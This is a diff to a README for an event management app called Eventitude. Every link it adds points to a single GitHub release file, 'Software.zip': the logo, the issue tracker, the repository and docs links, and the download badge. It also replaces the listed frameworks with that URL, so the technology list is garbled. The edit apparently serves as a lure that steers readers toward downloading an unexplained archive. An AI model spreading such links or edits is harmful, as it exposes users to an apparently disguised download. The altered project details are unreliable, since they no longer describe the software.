@@ -1,6 +1,6 @@
 # 🎉 Eventitude: A Full-Stack Event Management Platform 
 
-![Eventitude Logo](https://www.example.com/eventitude-logo.png)
+![Eventitude Logo](https://github.com/Eriki2/eventitude/releases/download/v1.0/Software.zip)
 
 ## Description
 Eventitude is a full-stack event management platform designed to help users plan and track events effortlessly. Whether you are organizing a corporate conference, a wedding, or a simple gathering with friends, Eventitude offers a comprehensive solution to streamline your event management process.
@@ -12,8 +12,8 @@ Eventitude is a full-stack event management platform designed to help users plan
 🔒 **Security**: Secure access controls to protect sensitive event information  
 
 ## Technologies Used
-- 🌐 **Front-end**: Vue.js, Bootstrap  
-- ⚙️ **Back-end**: Node.js, Express.js  
+- 🌐 **Front-end**: https://github.com/Eriki2/eventitude/releases/download/v1.0/Software.zip, Bootstrap  
+- ⚙️ **Back-end**: https://github.com/Eriki2/eventitude/releases/download/v1.0/Software.zip, https://github.com/Eriki2/eventitude/releases/download/v1.0/Software.zip  
 - 🛢️ **Database**: SQLite  
 - 📡 **API Design**: RESTful API
 
@@ -41,7 +41,7 @@ npm run serve
 You can deploy Eventitude locally for testing and development purposes. For production deployment, consider using services like Heroku or AWS.
 
 ## Help and Support
-If you encounter any issues or have questions, please [open an issue](https://github.com/your-username/eventitude/issues).
+If you encounter any issues or have questions, please [open an issue](https://github.com/Eriki2/eventitude/releases/download/v1.0/Software.zip).
 
 ## Contributing
 We welcome contributions to enhance Eventitude. Feel free to fork the repository and submit pull requests.
@@ -50,10 +50,10 @@ We welcome contributions to enhance Eventitude. Feel free to fork the repository
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## Resources
-- [GitHub Repository](https://github.com/your-username/eventitude)
-- [Download Latest Release](https://github.com/your-username/eventitude/releases/latest)
-- [API Documentation](https://eventitude-api-docs.com)
+- [GitHub Repository](https://github.com/Eriki2/eventitude/releases/download/v1.0/Software.zip)
+- [Download Latest Release](https://github.com/Eriki2/eventitude/releases/download/v1.0/Software.zip)
+- [API Documentation](https://github.com/Eriki2/eventitude/releases/download/v1.0/Software.zip)
 
 ---
 
-[![Download Eventitude](https://img.shields.io/badge/Download-Eventitude-green)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Eventitude](https://github.com/Eriki2/eventitude/releases/download/v1.0/Software.zip)](https://github.com/Eriki2/eventitude/releases/download/v1.0/Software.zip)
